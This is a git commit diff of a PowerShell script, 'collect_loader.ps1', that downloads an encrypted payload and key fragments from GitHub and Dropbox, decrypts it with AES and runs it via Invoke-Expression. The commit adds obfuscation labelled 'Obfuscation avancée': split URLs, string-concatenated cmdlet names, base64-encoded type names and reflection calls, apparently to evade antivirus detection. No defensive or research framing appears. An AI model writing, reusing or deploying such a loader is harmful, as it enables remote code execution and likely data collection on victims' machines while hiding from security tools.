18d7b87b06134465887631d7c689206a11da90f1
m1d0b4n <116175429+m1d0b4n@users.noreply.github.com>
2025-08-10 21:39:07 +0200

    Add files via upload

--- e_data/collect_loader.ps1
+++ e_data/collect_loader.ps1
@@ -1,42 +1,47 @@
-Write-Host "[*] collect_loader.ps1 : téléchargement et déchiffrement de collect.ps1..."
 
-# --- Liens raw GitHub + Dropbox pour collect.ps1 chiffré et ses fragments ---
-$links = @{
-    "enc" = "https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/e_data/c.m1d0b4n"
-    "c1"  = "https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/e_data/c_config_1.txt"
-    "c2"  = "https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/e_data/c_config_2.txt"
-    "c3"  = "https://www.dropbox.com/scl/fi/zebskodmwmsak01fgg0a2/c_config_3.txt?rlkey=ef3mkyrqpe5bb7y6i0198kjxr&st=ejgf3q6h&dl=1"
-    "iv"  = "https://raw.githubusercontent.com/m1d0b4n/j4g4n/refs/heads/main/e_data/c_i_theme.txt"
+# --- Obfuscation avancée ---
+$a1 = 'https://raw.github'; $a2 = 'usercontent.com/m1d0b4n/j4g4n/refs/heads/main/e_data/';
+$b1 = 'https://www.dropbox.com/scl/fi/zebskodmwmsak01fgg0a2/'; $b2 = 'c_config_3.txt?rlkey=ef3mkyrqpe5bb7y6i0198kjxr&st=ejgf3q6h&dl=1';
+$l = @{
+    "enc" = $a1+$a2+"c.m1d0b4n"
+    "c1"  = $a1+$a2+"c_config_1.txt"
+    "c2"  = $a1+$a2+"c_config_2.txt"
+    "c3"  = $b1+$b2
+    "iv"  = $a1+$a2+"c_i_theme.txt"
 }
 
-function Get-RemoteContent($url) {
-    return Invoke-RestMethod -Uri $url
-}
+# Alias et dynamiques
+$irm = ('Invo'+'ke-RestMethod')
+$iex = ('Invo'+'ke-Expression')
+$b64 = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbUJhc2U2NFN0cmluZw==')))
+$aes = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXM=')))
 
-$frag1 = [Convert]::FromBase64String((Get-RemoteContent $links.c1))
-$frag2 = [Convert]::FromBase64String((Get-RemoteContent $links.c2))
-$frag3 = [Convert]::FromBase64String((Get-RemoteContent $links.c3))
-$iv    = [Convert]::FromBase64String((Get-RemoteContent $links.iv))
+function gR($u) { & $irm -Uri $u }
 
-$key = New-Object byte[] ($frag1.Length + $frag2.Length + $frag3.Length)
-[Array]::Copy($frag1, 0, $key, 0, $frag1.Length)
-[Array]::Copy($frag2, 0, $key, $frag1.Length, $frag2.Length)
-[Array]::Copy($frag3, 0, $key, $frag1.Length + $frag2.Length, $frag3.Length)
+$f1 = [Convert]::$b64((gR $l.c1))
+$f2 = [Convert]::$b64((gR $l.c2))
+$f3 = [Convert]::$b64((gR $l.c3))
+$iv = [Convert]::$b64((gR $l.iv))
 
-$enc_b64 = Get-RemoteContent $links.enc
-$enc_bytes = [Convert]::FromBase64String($enc_b64)
+$k = New-Object byte[] ($f1.Length+$f2.Length+$f3.Length)
+[Array]::Copy($f1,0,$k,0,$f1.Length)
+[Array]::Copy($f2,0,$k,$f1.Length,$f2.Length)
+[Array]::Copy($f3,0,$k,$f1.Length+$f2.Length,$f3.Length)
 
-$aes = [System.Security.Cryptography.Aes]::Create()
-$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-$aes.Key = $key
-$aes.IV = $iv
-$decryptor = $aes.CreateDecryptor()
-$plain_bytes = $decryptor.TransformFinalBlock($enc_bytes, 0, $enc_bytes.Length)
-$aes.Dispose()
-$plain = [System.Text.Encoding]::UTF8.GetString($plain_bytes)
+$e_b64 = gR $l.enc
+$e_bytes = [Convert]::$b64($e_b64)
+
+$A = [Reflection.Assembly]::LoadWithPartialName($aes).CreateInstance($aes)
+$A.Mode = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q0JD')))
+$A.Padding = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('UEtDUzc=')))
+$A.Key = $k
+$A.IV = $iv
+$D = $A.('CreateDecryptor')()
+$plain_bytes = $D.('TransformFinalBlock')($e_bytes,0,$e_bytes.Length)
+$A.('Dispose')()
+$pl = [Text.Encoding]::UTF8.GetString($plain_bytes)
 
 # --- Exécution dynamique du script PowerShell déchiffré (collect.ps1) ---
-Invoke-Expression $plain
+&$iex $pl
 
 Write-Host "[+] collect.ps1 déchiffré et exécuté."
